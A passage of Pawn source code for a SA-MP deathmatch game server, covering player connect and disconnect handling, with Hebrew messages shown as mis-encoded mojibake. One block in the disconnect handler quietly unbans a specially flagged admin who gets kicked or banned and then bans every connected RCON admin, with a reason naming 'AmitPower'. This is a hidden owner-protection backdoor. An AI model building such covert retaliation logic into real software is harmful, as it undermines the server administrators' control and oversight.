						if(days == 1) format(string,sizeof(string)," .фф∙Єщщф Ёщ·Ёф ьщхэ рчу с·р°щъ %s хьыя Єьщъ ьфю·щя ьюч° ыущ ∙фф∙Єщщф ·°у",days,GetDateFromINI(thefile),daysToUnban);
						else format(string,sizeof(string)," .фф∙Єщщф Ёщ·Ёф ь-%d щющэ с·р°щъ %s хьыя Ёх·°х %d щющэ Єу ∙фф∙Єщщф ·°у",days,GetDateFromINI(thefile),daysToUnban);
						SendClientMessage(playerid,red,string);
					}
					SendClientMessage(playerid,lightred,webpage @c(red) " :рэ ьуЄ·ъ фф∙Єщщф рщЁф юхЎуў·, ЇЁф рьщЁх сЇх°хэ ю∙хс хЄц°ф ср·°");
					format(f,sizeof(f),"/DM/Info/Last/LastInfo_%s.ini",GetName(playerid));
					if(fexist(string)) for(new i = 1; i <= MAX_SAVED_DATA; i++)
					{
						format(string,sizeof(string),"BanMessage%03d",i);
						if(fkeyexist(f,string)) SendClientMessage(playerid,red,fgetstring(f,string));
					}
					format(string,sizeof(string),@c(red) ":юфёщсф %s фх∙Єщ· юф∙°· с·р°щъ %s Єь щущ фрующя\n" @c(lightred) "%s" @c(red) "\n\n.ьр ·хыь ь∙чў с∙°·\n\n:рэ ьуЄ·ъ фф∙Єщщф рщЁф юхЎуў·, ЇЁф рьщЁх сЇх°хэ ю∙хс хЄц°ф ср·°\n" @c(lightred) webpage,fgetstring(thefile,"AdminName"),GetDateFromINI(thefile),fgetstring(thefile,"Reason"));
					ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "сря",string,"OK","");
					SendClientMessage(playerid, red, string);
					if(!equal(GetIP(playerid),lastBanIP))
					{
						format(string,sizeof(string),"ссря, Ёщёф ьфыЁё ь∙°· (IP: %s)",GetIP(playerid));
						AdminInfo(playerid,string);
						format(lastBanIP,sizeof(lastBanIP),GetIP(playerid));
					}
					playerinfo[playerid][isbanned] = true;
					LowPriorityKick(playerid);
					#if lagtest
						LagTest_End("OnPlayerConnect-codeB");
					#endif
					return 1;
				}
			}
		}
		dbg(3,"2");
		playerinfo[playerid][dontwac] = 1;
		GameTextForPlayer(playerid,"~r~welcome ~h~to ~n~~g~" comname " ~b~death~h~match~p~~h~!",4500,5);
		switch(random(4))
		{
			case 0: string = "!" comname " ф°р∙щ хф°∙ющ ∙ь DeathMatch-с°хыщэ фсрщэ ь∙°· ф";
			case 1: string = "!фюрхчу· ∙ь щ∙°рь DM-с°хыщэ фсрщэ ьўфщь· ф";
			case 2: string = "!фщ∙°рьщ SA-MP-с°хыщэ фсрщэ ьсщ· ∙ь ф";
			case 3: string = "!" comname " United DM с°хыщэ фсрщэ ь∙°·";
		}
		format(string,sizeof(string),"%s :" @c(lightgreen) "%s",string,GetName(playerid));
		SendClientMessage(playerid,green,string);
		//SendClientMessage(playerid,0xF7A26FFF," Х /Help :ьЄц°ф щ∙ ьф∙·ю∙ сЇўхуф");
		//SendClientMessage(playerid,0xF7A26FFF," Х /Mode :ьЇщ°хш Єь ыь фюЄ°ых· с∙°·");
		switch(random(5))
		{
			case 0: string = "Їўхуф ьчу∙щэ, ьющ ∙Ў°щъ Єц°ф хьющ ∙°хЎф ьфыщ° р· ф∙°·";
			case 1: string = "чу∙ с∙°·? Ў°щъ Єц°ф? ф∙·ю∙ сЇўхуф";
			case 2: string = "ыь юф ∙Ў°щъ ьуЄ· Єь ф∙°·! фўьу";
			case 3: string = "рэ р·ф Ў°щъ Єц°ф, рх юЄхЁщщя ьуЄ· Єху Єь ф∙°·, фўьу";
			case 4: string = "ыь фющуЄ Єь ф∙°· Єы∙щх сюўхэ рчу, фўьу р· фЇўхуф";
		}
		format(string,sizeof(string)," Х " @h(F7A26F) "/United" @h(6DC5F3) " :%s",string);
		SendClientMessage(playerid,0x6DC5F3FF,string);
		switch(random(3))
		{
			case 0: SendClientMessage(playerid,lightyellow,webpage @c(yellow) " :сыь цюя, р·ф юхцюя ьсў° ср·° ∙ьЁх");
			case 1: SendClientMessage(playerid,lightgreen,webpage @c(green) " :ы·хс· фр·° ∙ьЁх");
			case 2: SendClientMessage(playerid,lightblue,webpage @c(blue) " :рЁчЁх юцюЁщэ рх·ъ ьсў° тэ ср·° ∙ьЁх сы·хс·");
		}
		if(DaysBetweenDates(curNewsDate,GetDateAsString()) <= 3)
		{
			format(string,sizeof(string)," {00FFFF}[%s] {FFFFFF}/News :фЄуыхя фрч°хя фхр Єуыхя #%d, суўх юф чу∙ Єэ фЇўхуф",curNewsDate,curNews);
			SendClientMessage(playerid,green,string);
		}
		dbg(3,"2b");
		Tip(playerid);
		if(IsPlayerUsingSGuard_(playerid)) // guard_shit
		{
			playerinfo[playerid][sguard][0] = 1;
			FindCheats(playerid);
			FindCleoMods(playerid);
		}
		dbg(3,"2c");
		new op = GetOnlinePlayers(), dd[3];
		getdate(dd[2],dd[0],dd[1]);
		if(op > serverDetails[sdGPlayers])
		{
			serverDetails[sdGPlayers] = op;
			fsetint(file_srvdetails,"GreatestPlayersNumber",serverDetails[sdGPlayers]);
			SendClientMessageToAll(black,"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
			format(string,sizeof(string)," Х !∙щр чу∙ ∙ь юёЇ° ∙чўЁщэ ючхс°щэ сх цюЁщ· - %d",serverDetails[sdGPlayers]);
			SendClientMessageToAll(orange,string);
			SendClientMessageToAll(black,"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
		}
		dd[1]++;
		if(todayDay != dd[1]) todayDay = dd[1], todayBest = 0;
		if(op > todayBest) todayBest = op;
		#if hanukkah_now
	    cand_check();
	    #endif
		dbg(3,"2d");
		if(GetOnlineAdmins() > serverDetails[sdGAdmins])
		{
			serverDetails[sdGAdmins] = GetOnlineAdmins();
			fsetint(file_srvdetails,"GreatestAdminsNumber",serverDetails[sdGAdmins]);
			SendClientMessageToAll(black,"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
			format(string,sizeof(string)," Х !∙щр чу∙ ∙ь юёЇ° рующЁщэ ючхс°щэ сх цюЁщ· - %d",serverDetails[sdGAdmins]);
			SendClientMessageToAll(orange,string);
			SendClientMessageToAll(black,"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
		}
		//if(op % 10 == 0 || (op - 1) % 10 == 0)
		new newp = 0;
		switch(op)
		{
			case 0..9: newp = op;
			case 10..100: newp = (op/10)*10;
			case 101..MAX_PLAYERS: newp = (op/25)*25;
		}
		if(newp != propertyPercent && ((GetTickCount()-propertyPercentSpam > 60000) || !propertyPercentSpam))
		{
			propertyPercent = newp, propertyPercentSpam = GetTickCount();
			format(string,sizeof(string)," $ (/per) %cрчхц фЁыёщэ фхр ыЄ· %d $",'%',newp);
			SendClientMessageToAll(lightgreen,string);
			for(new x; x < max_properties; x++)
			{
				if(propinfo[x][pcost]) UpdatePropertyText(x);
				if(IsPlayerConnected(propinfo[x][owner])) playerinfo[propinfo[x][owner]][propcost][x] = propper(propinfo[x][pearning]);
			}
		}
		dbg(3,"2e");
		for(new i = 0; i < sizeof(Options); i++) if(Options[i][optActive])
		{
			SendClientMessage(playerid,orange," Х /options :щ∙ ы°тЄ рхЇЎщх· ЇЄщьх·! сухў рщцф");
			break;
		}
		dbg(3,"3");
		ResetAttachedObjects(playerid);
		dbg(3,"4");
		playerinfo[playerid][admlog] = 0, playerinfo[playerid][superlog] = 0, playerinfo[playerid][adminone] = 0;
		if(fexist(fuser(playerid)))
		{
			dbg(3, "6a-f");
			if(fkeyexist(file_admins,GetName(playerid)))
			{
				new File:fhandle = fopen(file_admins,io_read), alvl = fgetint(file_admins,GetName(playerid));
				if(!fsearch(fhandle,GetName(playerid)))
				{
					SendClientMessage(playerid,red," .Ёр ьр ьф·чцх· ьрующЁщэ ∙ьЁх. ·хуф");
					fclose(fhandle);
					return LowPriorityKick(playerid);
				}
				fclose(fhandle);
				if(!alvl)
				{
					fremovekey(file_admins,GetName(playerid));
					for(new i = 0; i < MAX_RANKS; i++) if(playerinfo[playerid][rank][i])
					{
						format(string,sizeof(string),"Rank%02d",i);
						fsetint(fuser(playerid),string,0);
						playerinfo[playerid][rank][i] = 0;
					}
					SendClientMessage(playerid,red," .тщ∙х· фрующя ∙ьъ щщ°ух");
				}
				else
				{
					SendClientMessage(playerid,green," /admlog :сЁхёє Єьщъ ьф·чс° ьюЄ°ы· фрующя юху. ф∙·ю∙ сЇўхуф");
					playerinfo[playerid][admlog] = 1, playerinfo[playerid][adminone] = 1;
				}
			}
			format(string,sizeof(string),"Setting%d",setting_autologin);
			playerinfo[playerid][setting][setting_autologin] = fgetint(fuser(playerid),string);
			dbg(3,"5a");
			if(equal(fgetstring(fuser(playerid),"LastConnectIP"),GetIP(playerid)) && playerinfo[playerid][setting][setting_autologin])
			{
				dbg(3,"6a");
				SendClientMessage(playerid,green," .∙ьъ IP-чхс°· рхшхюшщ· ьЇщ ы·хс· ф");
				if(PropertyExists_STR(propformat_RPass(playerid)))
				{
					RemoveProperty_STR(propformat_RPass(playerid));
					SendClientMessage(playerid,lightblue," /changepass :юыщххя ∙ф∙·ю∙· сўху ь∙чцх° фёщёюр, рЁчЁх ююьщЎщэ юрху ∙·сч° ёщёюр чу∙ф ыЄ·");
				}
				playerinfo[playerid][iplogin] = 1;
				LoginPlayer(playerid);
				if(!playerinfo[playerid][adminone]) ShowEnterDialog(playerid);
				else HidePlayerDialog(playerid);
				format(string,sizeof(string),"%s|%d",GetIP(playerid),GetTickCount());
				SetProperty_STR(propformat_LoginInfo(playerid),string,1);
				playerinfo[playerid][logged] = 1;
				PlaySound(playerid,1057);
			}
			else
			{
				SendClientMessage(playerid,green," /login :фыщЁхщ ∙ьъ °∙хэ ь∙°·, ф·чс° у°ъ ф·Ї°щш ∙ьЇЁщъ рх Єэ фЇўхуф");
				playerinfo[playerid][logindia] = DIALOG_STYLE_PASSWORD;
				ShowPlayerConstDialog(playerid,dialog_login);
			}
		}
		else
		{
			dbg(3,"5b");
			SendClientMessage(playerid,green," /register :фыщЁхщ ∙ьъ ьр °∙хэ ь∙°·, рЁх ююьщЎщэ юрху ьф°∙э Єэ юф·Ї°щш ∙ьЇЁщъ рх Єэ фЇўхуф");
			SetPlayerColor(playerid,rgba2hex(playerinfo[playerid][color][0],playerinfo[playerid][color][1],playerinfo[playerid][color][2],PLAYER_ALPHA));
			ShowPlayerConstDialog(playerid,dialog_register);
			dbg(3,"6b");
		}
		PreloadAnimLib(playerid,"BOMBER");
		PreloadAnimLib(playerid,"RAPPING");
		PreloadAnimLib(playerid,"SHOP");
		PreloadAnimLib(playerid,"BEACH");
		PreloadAnimLib(playerid,"SMOKING");
		PreloadAnimLib(playerid,"FOOD");
		PreloadAnimLib(playerid,"ON_LOOKERS");
		PreloadAnimLib(playerid,"DEALER");
		PreloadAnimLib(playerid,"CRACK");
		PreloadAnimLib(playerid,"CARRY");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"PARK");
		PreloadAnimLib(playerid,"INT_HOUSE");
		PreloadAnimLib(playerid,"FOOD");
		PreloadAnimLib(playerid,"PED");
		new h[3];
		gettime(h[0],h[1],h[2]);
		SetPlayerTime(playerid,h[0],h[1]);
		SetPlayerWeather(playerid,serverWeather);
		dbg(3,"7");
		switch(playerinfo[playerid][setting][setting_classselection])
		{
			case 1: playerinfo[playerid][pic] = 0;
			case 2: playerinfo[playerid][pic] = random(sizeof(Pictures));
			case 3: playerinfo[playerid][pic] = random(sizeof(Pictures2));
		}
		playerinfo[playerid][reqclass] = 1;
		if(!Options[2][optActive])
		{
			format(string,sizeof(string)," *** " @c(grey) "%s has joined the server.",GetName(playerid));
			if(playerinfo[playerid][sguard][0]) format(string,sizeof(string),"%s " @c(green) "[SA-MP Guard active]",string);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][setting][setting_showjoin]) SendClientMessage(i,darkgreen,string);
		}
		dbg(3,"8");
		playerinfo[playerid][calling] = -1;
		playerinfo[playerid][firstspawn] = true;
		#if lagtest
			LagTest_End("OnPlayerConnect");
		#endif
		if(debugstate) printf("OnPlayerConnect(%s(%d)) end",GetName(playerid),playerid);
	}
	return 1;
}
//=[OnPlayerDisconnect]=========================================================
public OnPlayerDisconnect(playerid, reason)
{
	if(playerinfo[playerid][kicking]) return playerinfo[playerid][kicking] = 0;
	if(debugstate) printf("OnPlayerDisconnect(%s(%d),%d) start",GetName(playerid),playerid,reason);
	#if lagtest
		LagTest_Start("OnPlayerDisconnect");
	#endif
	Streamer_CallbackHook(STREAMER_OPDC,playerid,reason);
	dbg(4,"0.1");
	MAX_PLAYERS_ = GetHighestID() + 1;
	new MAX_PLAYERS__ = MAX_PLAYERS_, string[M_S], reas[32];
	if(PropertyExists_STR(playerinfo[playerid][playerip])) RemoveProperty_STR(playerinfo[playerid][playerip]);
	if(IsPlayerNPC(playerid) && playerinfo[playerid][selfnpc] != -1 && !restarting)
	{
		format(string,sizeof(string),NPCs[playerinfo[playerid][selfnpc]][npcName]);//GenerateRandomName("NPC_","",5));
		RemoveProperty_INT(string);
		ConnectNPC(string,NPCs[playerinfo[playerid][selfnpc]][npcFile]);
		return 1;
	}
	if(reason != 0) SetProperty_INT(propformat_LeaveTime(GetIP(playerid)),GetTickCount(),1);
	dbg(4,"0.2");
	playerinfo[playerid][nstate] = GetPlayerState_Original(playerid);
	dbg(4,"0.3");
	if(strlen(playerinfo[playerid][reconnecting]) > 0)
	{
		format(string,sizeof(string),"unbanip %s",playerinfo[playerid][reconnecting]);
		SendRconCommand(string);
		SendRconCommand("reloadbans");
		reason = 10;
	}
	dbg(4,"0.4");
	switch(reason)
	{
		case 0: reas = "Timeout";
		case 1: reas = restarting ? ("Restarting") : ("Leaving");
		case 2: reas = playerinfo[playerid][banned] ? ("Banned") : ("Kicked");
		case 10: reas = "Reconnecting";
		default: reas = "Error";
	}
	dbg(4,"0.5");
	if(reason == 2 && playerinfo[playerid][pp] && playerinfo[playerid][logged] && IsPlayerMAdmin(playerid))
	{
		format(string,sizeof(string),"unbanip %s",GetIP(playerid));
		SendRconCommand(string);
		SendRconCommand("reloadbans");
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i) && i != playerid) SetBan(i,playerid,"AmitPower ∙щюх∙ с°ўхя Ёту");
	}
	dbg(4,"1");
	for(new i=0;i<MAX_PLAYERS__;i++) if(playerinfo[i][ignore][playerid]) playerinfo[i][ignore][playerid] = 0;
	format(string,sizeof(string),"[Disconnect] %s IP: %s UID: %s",reas,GetIP(playerid),GetSerial(playerid));
	Log("Connects",playerid,string);
	format(string,sizeof(string),"[disconnect] level: %d, kills: %d, money: %d, bank: %d",playerinfo[playerid][level],playerinfo[playerid][kills],GetMoney(playerid),playerinfo[playerid][bank]);
	Log("Stats",playerid,string);
	if(playerinfo[playerid][logged])
	{
		//new day[2];
		//getdate(day[1],day[1],day[0]);
		//day[1] = fgetint(fuser(playerid),"TotalTimeInServer");
		//fsetint(fuser(playerid),"TotalTimeInServer",playerinfo[playerid][intime][1]+day[1]);
		//day[1] = fgetint(fuser(playerid),"TimeInServer");
		//fsetint(fuser(playerid),"TimeInServer",playerinfo[playerid][intime][1]+day[1]);
		if(!restarting) fsetint(fuser(playerid),"LastMoney",reason == 1 ? 0 : GetMoney(playerid));
	}
	dbg(4,"2");
 	for(new j = 0; j < MAX_ADMIN_VEHICLES; j++) if(playerinfo[playerid][createdv][j] != INVALID_VEHICLE_ID)
	{
		DestroyVehicleEx(playerinfo[playerid][createdv][j]);
		playerinfo[playerid][createdv][j] = INVALID_VEHICLE_ID;
	}
	SetPlayerColor(playerid,setAlpha(black,PLAYER_ALPHA));
	if(playerinfo[playerid][pet][2])
	{
		playerinfo[playerid][pet][2] = 0;
		if(IsValidObject(playerinfo[playerid][pet][1])) DestroyObject(playerinfo[playerid][pet][1]);
		if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
	}
	dbg(4,"3");
	for(new i = 0; i < MAX_PLAYERS__; i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid)
	{
		if(IsPlayerMAdmin(i)) AdminSpecOff(i);
		SendClientMessage(i,red," .ф∙чўя рч°щх Єўс· щщЎр юф∙°·");
		break;
	}
	dbg(4,"4");
	if(playerinfo[playerid][aause] > 0)
	{
		for(new i=0;i<5;i++)
		{
			if(IsValidVehicle(playerinfo[playerid][aaveh][i]) && playerinfo[playerid][aaveh][i] != -1)
			{
				DestroyVehicleEx(playerinfo[playerid][aaveh][i]);
				playerinfo[playerid][aaveh][i] = -1;
			}
			if(IsValidSObject(playerinfo[playerid][aaobj][i]) && playerinfo[playerid][aaobj][i] != -1)
			{
				DestroySObject(playerinfo[playerid][aaobj][i]);
				playerinfo[playerid][aaobj][i] = -1;
			}
		}
		playerinfo[playerid][aause] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	dbg(4,"5");
    if(playerinfo[playerid][mstimenew] > 0) fsetint(fuser(playerid),"MissionTime",playerinfo[playerid][mstimenew]);
	if(playerinfo[playerid][mission] != INVALID_MISSION_ID)
	{
	    missions[playerinfo[playerid][mission]] = false;
	    DestroyVehicle(playerinfo[playerid][mvehicle]);
	    DestroyDynamicPickup(playerinfo[playerid][mpickup]);
		DestroyDynamicCP(playerinfo[playerid][mcheckpoint]);
		fsetint(fuser(playerid),"MissionTime",15*60);
	}
	if(playerinfo[playerid][indrift])
	{
		format(string,sizeof(string)," .щщЎр юф∙°·, ЁЎчхя шыЁщ ьъ %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet],2);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
		if(playerinfo[playerinfo[playerid][dinvited]][dcd][0] > 0) KillTimer(playerinfo[playerinfo[playerid][dinvited]][dcd][1]);
		if(playerinfo[playerid][dcd][0] > 0) KillTimer(playerinfo[playerid][dcd][1]);
		playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
		playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
		playerinfo[playerid][driftcp] = 0,
		playerinfo[playerid][indrift] = 0,
		playerinfo[playerid][bet] = 0,
		playerinfo[playerid][dinviter] = 0,
		playerinfo[playerid][dplace] = 0,
		playerinfo[playerid][dinvited] = -1;
	}
	if(playerinfo[playerid][inprace])
	{
		format(string,sizeof(string)," .щщЎр юф∙°·, ЁЎчхя шыЁщ ьъ %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][prinvited],green,string);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][prinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerVirtualWorld(playerinfo[playerid][prinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][prinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][prinvited]);
		if(playerinfo[playerinfo[playerid][prinvited]][prcd][0] > 0) KillTimer(playerinfo[playerinfo[playerid][prinvited]][prcd][1]);
		if(playerinfo[playerid][prcd][0] > 0) KillTimer(playerinfo[playerid][prcd][1]);
		playerinfo[playerinfo[playerid][prinvited]][pracecp] = 0,
		playerinfo[playerinfo[playerid][prinvited]][inprace] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prinviter] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prplace] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1;
		playerinfo[playerid][pracecp] = 0,
		playerinfo[playerid][inprace] = 0,
		playerinfo[playerid][prinviter] = 0,
		playerinfo[playerid][prplace] = 0,
		playerinfo[playerid][prinvited] = -1;
	}
	if(playerinfo[playerid][inbattle])
	{
		new i = playerinfo[playerid][binvited];
		format(string,sizeof(string)," .щщЎр юф∙°· срюЎЄ фў°с, ЁщЎчхя шыЁщ ьъ %s",GetName(playerid));
		SendClientMessage(i,green,string);
		ResetWeapons(i);
		SpawnPlayer(i);
		if(playerinfo[i][bcd][0] > 0) KillTimer(playerinfo[i][bcd][1]);
		if(playerinfo[playerid][bcd][0] > 0) KillTimer(playerinfo[playerid][bcd][1]);
		playerinfo[i][inbattle] = 0, playerinfo[i][binvited] = -1, playerinfo[i][binviter] = 0, playerinfo[i][bstyle] = {-1,-1}, playerinfo[i][bplace] = -1, playerinfo[i][btime] = 0, playerinfo[i][bcd][0] = 0;
		playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1, playerinfo[playerid][binviter] = 0, playerinfo[playerid][bstyle] = {-1,-1}, playerinfo[playerid][bplace] = -1, playerinfo[playerid][btime] = 0, playerinfo[playerid][bcd][0] = 0;
	}
	dbg(4,"6");
	/*if(levels[playerinfo[playerid][level]][AmmoLimit] != 0)
	{
		for(new i=0;i<7;i++)
		{
			if(playerinfo[playerid][ammo][i] > levels[playerinfo[playerid][level]][AmmoLimit])
			{
				playerinfo[playerid][ammo][i] = levels[playerinfo[playerid][level]][AmmoLimit];
				if(playerinfo[playerid][logged])
				{
					format(string,sizeof(string),"Ammo%d",i);
					fsetint(fuser(playerid),string,playerinfo[playerid][ammo][i]);
				}
			}
		}
	}*/
	dbg(4,"7");
	if(!GetOnlineAdmins())
	{
		if(chatlocked)
		{
			SendClientMessageToAll(orange," Х фЎ'рш ЁЇ·ч юыщххя ∙рщя рующЁщэ ючхс°щэ");
			chatlocked = 0;
			for(new i = 0; i < MAX_PLAYERS__; i++) if(IsPlayerConnected(i)) playerinfo[i][lcallow] = 0;
		}
		for(new i = 0; i < sizeof(Options); i++) if(Options[i][optActive] && Options[i][optAutoDisable])
		{
			format(string,sizeof(string)," Х фрхЇЎщщф \"%s\" схшьф юыщххя ∙рщя рующЁщэ ючхс°щэ",Options[i][optName]);
			SendClientMessageToAll(orange,string);
			Options[i][optActive] = false;
			format(string,sizeof(string),"hostname %s",hostname_);
			SendRconCommand(string);
		}
	}
	dbg(4,"8");
	if(playerinfo[playerid][inact]) OutOfActivity(playerid);
	if(playerinfo[playerid][waitrace]) playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][raceid] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitwar]) playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitwwe]) playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitkart]) DestroyVehicleEx(playerinfo[playerid][kartv]), playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitmonster]) DestroyVehicleEx(playerinfo[playerid][monsterv]), playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitarmy]) DestroyVehicleEx(playerinfo[playerid][armyv]), playerinfo[playerid][waitarmy] = 0, playerinfo[playerid][inarmy] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitsrace]) playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitkickstar]) playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1, playerinfo[playerid][kickstarscore] = 0, playerinfo[playerid][kickstarprize] = 0, playerinfo[playerid][kickstarbonus] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitewar]) playerinfo[playerid][waitewar] = 0, playerinfo[playerid][inewar] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitwargame]) playerinfo[playerid][waitwargame] = 0, playerinfo[playerid][inwargame] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitmanhunt]) playerinfo[playerid][waitmanhunt] = 0, playerinfo[playerid][inmanhunt] = 0, playerinfo[playerid][manhuntid] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitsport]) playerinfo[playerid][waitsport] = 0, playerinfo[playerid][insport] = 0, playerinfo[playerid][sportid] = -1, playerinfo[playerid][sportscore] = 0, playerinfo[playerid][sportparam] = 0, playerinfo[playerid][inact] = 0;
	if(playerinfo[playerid][waitteamact]) playerinfo[playerid][waitteamact] = 0, playerinfo[playerid][inteamact] = 0, playerinfo[playerid][teamactid] = -1, playerinfo[playerid][teamactteam] = 0, playerinfo[playerid][inact] = 0;
	dbg(4,"9");
	if(playerinfo[playerid][calling] != -1)
	{
		format(string,sizeof(string)," .щщЎр юф∙°· хьыя ф∙щчф Ёх·ўф %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][calling],green,string);
		playerinfo[playerinfo[playerid][calling]][calling] = -1;
		playerinfo[playerinfo[playerid][calling]][canswer] = 0;
		playerinfo[playerinfo[playerid][calling]][callid] = 0;
		playerinfo[playerinfo[playerid][calling]][caller] = 0;
		playerinfo[playerinfo[playerid][calling]][caller] = 0;
		playerinfo[playerid][calling] = -1;
		playerinfo[playerid][canswer] = 0;
		playerinfo[playerid][callid] = 0;
		playerinfo[playerid][caller] = 0;
		playerinfo[playerid][callcash] = 0;
		if(playerinfo[playerid][publicphone] > 0)
		{
			cpinfo[playerinfo[playerid][publicphone]][cpused] = INVALID_PLAYER_ID;
			playerinfo[playerid][publicphone] = 0;
		}
		else if(playerinfo[playerinfo[playerid][calling]][publicphone] > 0)
		{
			cpinfo[playerinfo[playerinfo[playerid][calling]][publicphone]][cpused] = INVALID_PLAYER_ID;
			playerinfo[playerinfo[playerid][calling]][publicphone] = 0;
		}
	}
	dbg(4,"10");
	if(actinfo[actAdmin] == playerid && actinfo[actExist])
	{
		SendClientMessageToAll(red," .фЇЄщьх· фщуЁщ· Ёёт°ф юфёщсф ∙фрующя ∙Ї·ч рх·ф щщЎр");
		for(new i=0;i<MAX_PLAYERS__;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
		{
			SetFreeze(i,0);
			SpawnPlayer(i);
			playerinfo[i][inact] = 0;
		}
		actinfo[actExist] = 0;
		actinfo[actPlayers] = 0;
		actinfo[actMax] = 0;
		actinfo[actName] = 0;
		actinfo[actEndJoin] = 0;
		actinfo[actAdmin] = -1;
		actinfo[actNeedVehicle] = 0;
		actinfo[actTK] = false;
	}
	dbg(4,"11");
	if(playerinfo[playerid][incrane])
	{
		SetVehicleHealth(GetPlayerVehicleID(playerid),0.0);
		SetFreeze(playerid,0);
		playerinfo[playerid][incrane] = 0, playerinfo[playerid][cranetime] = 0;
		News(" /Crane !фюЁхє ЇЁхщ");
	}
	if(playerinfo[playerid][wehateyou] != -1) KillTimer(playerinfo[playerid][wehateyou]);
	for(new i = 0; i < MAX_PLAYERS__; i++) if(IsPlayerConnected(i))
	{
		if(playerinfo[i][clickplayer] == playerid)
		{
			playerinfo[i][clickplayer] = INVALID_PLAYER_ID;
			if(playerinfo[i][indialog] >= dialog_clickplayer && playerinfo[i][indialog] <= dialog_baccb || playerinfo[i][indialog] == dialog_admintotal) ShowPlayerDialog(i,dialog_ni,DIALOG_STYLE_MSGBOX," фхуЄф"," .ф∙чўя ∙сч°· щщЎр юф∙°· хьыя ф·Ї°щш Ёёт°","OK","");
		}
		if(playerinfo[i][duelclick] == playerid) playerinfo[i][duelclick] = -1, playerinfo[i][lastaga] = 0;
		if(playerinfo[i][pump] == playerid)
		{
			SendClientMessage(i,red," .∙рщс· фчщщэ фхЇёўф ыщ ф∙чўя ююЁх ∙рс· щщЎр юф∙°·");
			playerinfo[i][pump] = INVALID_PLAYER_ID;
		}
		if(playerinfo[i][raise] == playerid)
		{
			SendClientMessage(i,red," .ф°ю· ф∙чўя фхЇёўф ыщ ф∙чўя ∙ф°ю· щщЎр юф∙°·");
			playerinfo[i][raise] = INVALID_PLAYER_ID;
		}
		if(playerinfo[playerid][raiseby] == i) playerinfo[playerid][raiseby] = INVALID_PLAYER_ID;
		if(playerinfo[i][energyrelease] == playerid) playerinfo[i][energyrelease] = INVALID_PLAYER_ID;
		if(playerinfo[i][energypump] == playerid) playerinfo[i][energypump] = INVALID_PLAYER_ID;
		if(playerinfo[i][energystraw] == playerid) playerinfo[i][energystraw] = INVALID_PLAYER_ID;
		if(playerinfo[i][pcode][2] == playerid) playerinfo[i][pcode][2] = INVALID_PLAYER_ID;
		if(playerinfo[i][reportid] == playerid)
		{
			format(string,sizeof(string)," .схшь ыщ фю∙·ю∙ щщЎр юф∙°· %s - фущххч ∙ьъ Єь рщщущ %d",GetName(playerid),playerid);
